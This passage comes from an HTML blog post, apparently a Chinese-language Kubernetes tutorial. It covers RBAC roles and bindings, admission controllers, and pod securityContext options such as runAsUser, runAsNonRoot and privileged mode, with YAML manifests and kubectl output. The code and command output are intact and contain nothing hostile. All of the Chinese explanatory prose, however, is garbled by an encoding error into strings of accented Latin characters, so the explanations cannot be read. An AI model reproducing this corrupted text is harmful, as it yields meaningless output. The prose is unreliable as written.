è®ºå“ªä¸€ç§ï¼ŒKuberneteséƒ½ä¼šä¸ºtokenç»‘å®šä¸€ä¸ªé»˜è®¤çš„Userå’ŒGroupã€‚Podä½¿ç”¨<code>ServiceAccount</code>è®¤è¯æ—¶ï¼Œ<code>service-account-token</code>ä¸­çš„JWTä¼šä¿å­˜Userä¿¡æ¯ï¼Œæœ‰äº†ç”¨æˆ·ä¿¡æ¯ï¼Œå†åˆ›å»ºä¸€å¯¹è§’è‰²/è§’è‰²ç»‘å®š(é›†ç¾¤è§’è‰²/é›†ç¾¤è§’è‰²ç»‘å®š)èµ„æºå¯¹è±¡ï¼Œå°±å¯ä»¥å®Œæˆæƒé™ç»‘å®šäº†ã€‚</p><h5 id="Role-and-ClusterRole"><a href="#Role-and-ClusterRole" class="headerlink" title="Role and ClusterRole"></a>Role and ClusterRole</h5><p>åœ¨RBAC APIä¸­ï¼ŒRoleè¡¨ç¤ºä¸€ç»„è§„åˆ™æƒé™ï¼Œæƒé™åªä¼šå¢åŠ (ç´¯åŠ æƒé™)ï¼Œä¸å­˜åœ¨ä¸€ä¸ªèµ„æºä¸€å¼€å§‹å°±æœ‰å¾ˆå¤šæƒé™è€Œé€šè¿‡RBACå¯¹å…¶è¿›è¡Œå‡å°‘çš„æ“ä½œï¼ŒRoleå¯ä»¥å®šä¹‰åœ¨ä¸€ä¸ªnamespaceä¸­ï¼Œå¦‚æœæƒ³è¦è·¨namespaceåˆ™å¯ä»¥åˆ›å»ºClusterRole</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["pods"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><p>ClusterRoleå…·æœ‰å’ŒRoleç›¸åŒçš„æƒé™è§’è‰²æ§åˆ¶èƒ½åŠ›ï¼Œä¸åŒçš„æ˜¯ï¼ŒClusterRoleæ˜¯é›†ç¾¤çº§åˆ«çš„ï¼Œå¯ä»¥ç”¨äº</p><ul><li>é›†ç¾¤çº§åˆ«çš„èµ„æºæ§åˆ¶ï¼ˆä¾‹å¦‚nodeè®¿é—®æƒé™ï¼‰</li><li>éèµ„æºå‹ endpointsï¼ˆä¾‹å¦‚<code>/healthz</code>è®¿é—®ï¼‰</li><li>æ‰€æœ‰å‘½åç©ºé—´èµ„æºæ§åˆ¶ï¼ˆä¾‹å¦‚podsï¼‰</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["secrets"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><h5 id="RoleBinding-and-ClusterRoleBinding"><a href="#RoleBinding-and-ClusterRoleBinding" class="headerlink" title="RoleBinding and ClusterRoleBinding"></a>RoleBinding and ClusterRoleBinding</h5><p>RoleBindingå¯ä»¥å°†è§’è‰²ä¸­å®šä¹‰çš„æƒé™æˆäºˆç”¨æˆ·æˆ–ç”¨æˆ·ç»„ï¼ŒRoleBindingåŒ…å«ä¸€ç»„æƒé™åˆ—è¡¨(subjects)ï¼Œæƒé™åˆ—è¡¨ä¸­åŒ…å«æœ‰ä¸åŒå½¢å¼çš„å¾…æˆäºˆæƒé™èµ„æºç±»å‹(users,groups,service accounts)ï¼ŒRoleBindingåŒæ ·åŒ…å«å¯¹è¢«Bindçš„Roleå¼•ç”¨ï¼ŒRoleBindingé€‚ç”¨äºæŸä¸ªå‘½åç©ºé—´å†…æˆæƒï¼Œè€ŒClusterRoleBindingé€‚ç”¨äºé›†ç¾¤èŒƒå›´å†…çš„æˆæƒã€‚</p><p>ä¾‹å¦‚ï¼Œè¦å°†defaultå‘½åç©ºé—´çš„<code>pod-reader</code> Roleæˆäºˆelssmç”¨æˆ·ï¼Œæ­¤åelssmç”¨æˆ·åœ¨defaultå‘½åç©ºé—´å°†å…·æœ‰<code>pod-reader</code>çš„æƒé™</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">elssm</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>RoleBindingåŒæ ·å¯ä»¥å¼•ç”¨ClusterRoleæ¥å¯¹å½“å‰namespaceå†…ç”¨æˆ·ã€ç”¨æˆ·ç»„æˆ–ServiceAccountè¿›è¡Œæˆæƒï¼Œè¿™ç§æ“ä½œå…è®¸é›†ç¾¤ç®¡ç†å‘˜åœ¨æ•´ä¸ªé›†ç¾¤å†…å®šä¹‰ä¸€äº›é€šç”¨çš„ClusterRoleï¼Œç„¶ååœ¨ä¸åŒçš„namespaceä¸­ä½¿ç”¨RoleBindingæ¥å¼•ç”¨ã€‚</p><p>ä¾‹å¦‚ï¼Œä»¥ä¸‹RoleBindingå¼•ç”¨äº†ä¸€ä¸ªClusterRoleï¼Œè¿™ä¸ªClusterRoleå…·æœ‰æ•´ä¸ªé›†ç¾¤å†…å¯¹secretsçš„è®¿é—®æƒé™ï¼Œä½†æ˜¯å…¶æˆæƒç”¨æˆ·<code>warry</code>åªèƒ½è®¿é—®developmentç©ºé—´ä¸­çš„secretsï¼ˆå› ä¸ºRoleBindingå®šä¹‰åœ¨developmentå‘½åç©ºé—´ï¼‰</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">warry</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ClusterRoleBindingå¯¹æ•´ä¸ªé›†ç¾¤ä¸­çš„æ‰€æœ‰å‘½åç©ºé—´èµ„æºæƒé™è¿›è¡Œæˆæƒï¼Œä»¥ä¸‹ClusterRoleBindingä¾‹å­å±•ç¤ºäº†æˆæƒmanagerç»„å†…æ‰€æœ‰ç”¨æˆ·åœ¨å…¨éƒ¨å‘½åç©ºé—´ä¸­å¯¹secretsè¿›è¡Œè®¿é—®</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets-global</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">Group</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">manager</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><h4 id="Admission-Controll"><a href="#Admission-Controll" class="headerlink" title="Admission Controll"></a>Admission Controll</h4><p>å‡†å…¥æ§åˆ¶æ˜¯<code>API Server</code>çš„æ’ä»¶é›†åˆï¼Œé€šè¿‡æ·»åŠ ä¸åŒçš„æ’ä»¶ï¼Œå®ç°é¢å¤–çš„å‡†å…¥æ§åˆ¶è§„åˆ™ï¼Œç”šè‡³äº<code>API Server</code>çš„ä¸€äº›ä¸»è¦çš„åŠŸèƒ½éƒ½éœ€è¦é€šè¿‡<code>Admission Controllers</code>ï¼Œæ¯”å¦‚ServiceAccount</p><p>ä¸€äº›æ’ä»¶çš„åŠŸèƒ½</p><ul><li>Namespace Lifecycleï¼šé˜²æ­¢åœ¨ä¸å­˜åœ¨çš„namespaceä¸Šåˆ›å»ºå¯¹è±¡ï¼Œé˜²æ­¢åˆ é™¤ç³»ç»Ÿé¢„ç½®çš„namespace</li><li>LimitRangerï¼šç¡®ä¿è¯·æ±‚çš„èµ„æºä¸ä¼šè¶…è¿‡æ‰€åœ¨namespaceçš„LimitRangeçš„é™åˆ¶</li><li>Service Accountï¼šå®ç°äº†è‡ªåŠ¨åŒ–æ·»åŠ ServiceAccount</li><li>ResourceQuotaï¼šç¡®ä¿è¯·æ±‚çš„èµ„æºä¸ä¼šè¶…è¿‡èµ„æºçš„ResourceQuotaé™åˆ¶</li></ul><h4 id="é…ç½®èŠ‚ç‚¹çš„å®‰å…¨ä¸Šä¸‹æ–‡"><a href="#é…ç½®èŠ‚ç‚¹çš„å®‰å…¨ä¸Šä¸‹æ–‡" class="headerlink" title="é…ç½®èŠ‚ç‚¹çš„å®‰å…¨ä¸Šä¸‹æ–‡"></a>é…ç½®èŠ‚ç‚¹çš„å®‰å…¨ä¸Šä¸‹æ–‡</h4><p>æˆ‘ä»¬å¯ä»¥åœ¨Podæˆ–å…¶æ‰€å±å®¹å™¨çš„æè¿°ä¸­é€šè¿‡security-Contexté€‰é¡¹é…ç½®å…¶ä»–ä¸å®‰å…¨æ€§ç›¸å…³çš„ç‰¹æ€§ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥é€‚ç”¨äºæ•´ä¸ªpodï¼Œæˆ–è€…æ¯ä¸ªpodä¸­å•ç‹¬çš„å®¹å™¨ã€‚</p><p>é…ç½®å®‰å…¨ä¸Šä¸‹æ–‡å¯ä»¥ä½¿æˆ‘ä»¬å®Œæˆå¾ˆå¤šäº‹æƒ…ï¼Œä¾‹å¦‚</p><ul><li>æŒ‡å®šå®¹å™¨ä¸­è¿è¡Œè¿›ç¨‹çš„ç”¨æˆ·(ç”¨æˆ·ID)</li><li>é˜»æ­¢å®¹å™¨ä½¿ç”¨rootç”¨æˆ·è¿è¡Œ</li><li>ä½¿ç”¨ç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œä½¿å…¶å¯¹å®¿ä¸»èŠ‚ç‚¹çš„å†…æ ¸å…·æœ‰å®Œå…¨çš„è®¿é—®æƒé™</li><li>é€šè¿‡æ·»åŠ æˆ–ç¦ç”¨å†…æ ¸åŠŸèƒ½ï¼Œé…ç½®ç»†ç²’åº¦çš„å†…æ ¸è®¿é—®æƒé™</li><li>è®¾ç½®SELinux(å®‰å…¨å¢å¼ºå‹Linux)é€‰é¡¹ï¼ŒåŠ å¼ºå¯¹å®¹å™¨çš„é™åˆ¶</li><li>é˜»æ­¢è¿›ç¨‹å†™å…¥å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ</li></ul><h5 id="è¿è¡Œæ²¡æœ‰é…ç½®å®‰å…¨ä¸Šä¸‹æ–‡çš„pod"><a href="#è¿è¡Œæ²¡æœ‰é…ç½®å®‰å…¨ä¸Šä¸‹æ–‡çš„pod" class="headerlink" title="è¿è¡Œæ²¡æœ‰é…ç½®å®‰å…¨ä¸Šä¸‹æ–‡çš„pod"></a>è¿è¡Œæ²¡æœ‰é…ç½®å®‰å…¨ä¸Šä¸‹æ–‡çš„pod</h5><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>pod-with-defaults</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-with-defaults</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl create -f pod-with-defaults.yaml </span><br><span class="line">pod/pod-with-defaults created</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿™ä¸ªå®¹å™¨ä¸­çš„ç”¨æˆ·IDå’Œç»„IDä»¥åŠå®ƒæ‰€å±çš„ç”¨æˆ·ç»„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-with-defaults -- id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªå®¹å™¨åœ¨ç”¨æˆ·ID(uid)ä¸º0çš„ç”¨æˆ·ï¼Œç”¨æˆ·ç»„ID(gid)ä¸º0çš„ç”¨æˆ·ç»„ä¸‹è¿è¡Œï¼Œå®ƒåŒæ ·è¿˜å±äºä¸€äº›å…¶ä»–çš„ç”¨æˆ·ç»„ã€‚</p><h5 id="è¿è¡ŒæŒ‡å®šç”¨æˆ·çš„pod"><a href="#è¿è¡ŒæŒ‡å®šç”¨æˆ·çš„pod" class="headerlink" title="è¿è¡ŒæŒ‡å®šç”¨æˆ·çš„pod"></a>è¿è¡ŒæŒ‡å®šç”¨æˆ·çš„pod</h5><p>ä¸ºäº†ä½¿ç”¨ä¸€ä¸ªä¸é•œåƒä¸­ä¸åŒçš„ç”¨æˆ·IDæ¥è¿è¡Œpodï¼Œéœ€è¦è®¾ç½®è¯¥podçš„<code>securityContext.runAsUser</code>é€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥è¿è¡Œä¸€ä¸ªä½¿ç”¨guestç”¨æˆ·è¿è¡Œçš„å®¹å™¨ã€‚</p><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>pod-as-user-guest</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­id405å¯¹åº”guestç”¨æˆ·</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-as-user-guest</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsUser:</span> <span class="number">405</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨podåæŸ¥çœ‹ï¼Œå‘ç°è¯¥å®¹å™¨åœ¨guestç”¨æˆ·ä¸‹è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-as-user-guest -- id</span><br><span class="line">uid=405(guest) gid=100(users)</span><br></pre></td></tr></table></figure><h5 id="é˜»æ­¢å®¹å™¨ä»¥rootç”¨æˆ·è¿è¡Œ"><a href="#é˜»æ­¢å®¹å™¨ä»¥rootç”¨æˆ·è¿è¡Œ" class="headerlink" title="é˜»æ­¢å®¹å™¨ä»¥rootç”¨æˆ·è¿è¡Œ"></a>é˜»æ­¢å®¹å™¨ä»¥rootç”¨æˆ·è¿è¡Œ</h5><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>pod-run-as-non-root</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-run-as-non-root</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨podåæŸ¥çœ‹podä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod pod-run-as-non-root     </span><br><span class="line">NAME                  READY   STATUS                       RESTARTS   AGE</span><br><span class="line">pod-run-as-non-root   0/1     CreateContainerConfigError   0          5m16s</span><br></pre></td></tr></table></figure><p>å‘ç°podå¹¶æ²¡æœ‰è¿è¡Œï¼Œé€šè¿‡describeæŸ¥çœ‹å…·ä½“ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod pod-run-as-non-root      </span><br><span class="line">Name:         pod-run-as-non-root</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Tue, 26 Oct 2021 13:53:32 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Pending</span><br><span class="line">node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Error: container has runAsNonRoot and image will run as root (pod: "pod-run-as-non-root_default", container: main)</span><br></pre></td></tr></table></figure><h5 id="è¿è¡Œä½¿ç”¨ç‰¹æƒæ¨¡å¼çš„pod"><a href="#è¿è¡Œä½¿ç”¨ç‰¹æƒæ¨¡å¼çš„pod" class="headerlink" title="è¿è¡Œä½¿ç”¨ç‰¹æƒæ¨¡å¼çš„pod"></a>è¿è¡Œä½¿ç”¨ç‰¹æƒæ¨¡å¼çš„pod</h5><p>ä¸ºäº†è·å–å®¿ä¸»æœºå†…æ ¸çš„å®Œæ•´æƒé™ï¼Œè¯¥podéœ€è¦åœ¨ç‰¹æƒæ¨¡å¼ä¸‹è¿è¡Œï¼Œè¿™å¯ä»¥é€šè¿‡å°†å®¹å™¨çš„<code>securityContext</code>ä¸­çš„<code>privileged</code>è®¾ç½®ä¸º<code>true</code>å®ç°ã€‚</p><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>pod-privileged</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-privileged</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>éƒ¨ç½²å¥½è¿™ä¸ªpodä¹‹åï¼Œæˆ‘ä»¬ä¸ä¹‹å‰éƒ¨ç½²çš„éç‰¹æƒæ¨¡å¼çš„podåšå¯¹æ¯”ã€‚</p><p>é¦–å…ˆä½¿ç”¨ä¹‹å‰çš„åä¸º<code>pod-with-defaults</code>çš„podï¼Œé€šè¿‡åˆ—å‡º<code>/dev</code>ç›®å½•ä¸‹æ–‡ä»¶çš„æ–¹å¼æŸ¥çœ‹éç‰¹æƒæ¨¡å¼å®¹å™¨ä¸­çš„è®¾å¤‡ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls /dev</span><br><span class="line">core</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">mqueue</span><br><span class="line">null</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">shm</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">termination-log</span><br><span class="line">tty</span><br><span class="line">urandom</span><br><span class="line">zero</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ—å‡ºç‰¹æƒæ¨¡å¼å®¹å™¨<code>/dev</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°ï¼Œç‰¹æƒæ¨¡å¼çš„podå¯ä»¥çœ‹åˆ°å®¿ä¸»èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰è®¾å¤‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-privileged -- ls /dev</span><br><span class="line">cachefiles</span><br><span class="line">core</span><br><span class="line">cpu</span><br><span class="line">cpu_dma_latency</span><br><span class="line">cuse</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">fuse</span><br><span class="line">hpet</span><br><span class="line">hwrng</span><br><span class="line">input</span><br><span class="line">kmsg</span><br><span class="line">loop-control</span><br><span class="line">loop0</span><br><span class="line">loop1</span><br><span class="line">loop2</span><br><span class="line">loop3</span><br><span class="line">loop4</span><br><span class="line">loop5</span><br><span class="line">loop6</span><br><span class="line">loop7</span><br><span class="line">mapper</span><br><span class="line">mem</span><br><span class="line">mqueue</span><br><span class="line">nbd0</span><br><span class="line">nbd1</span><br><span class="line">nbd10</span><br><span class="line">nbd11</span><br><span class="line">nbd2</span><br><span class="line">nbd3</span><br><span class="line">nbd4</span><br><span class="line">nbd5</span><br><span class="line">net</span><br><span class="line">null</span><br><span class="line">nvram</span><br><span class="line">port</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">ram0</span><br><span class="line">ram1</span><br><span class="line">ram10</span><br><span class="line">ram2</span><br><span class="line">ram3</span><br><span class="line">ram4</span><br><span 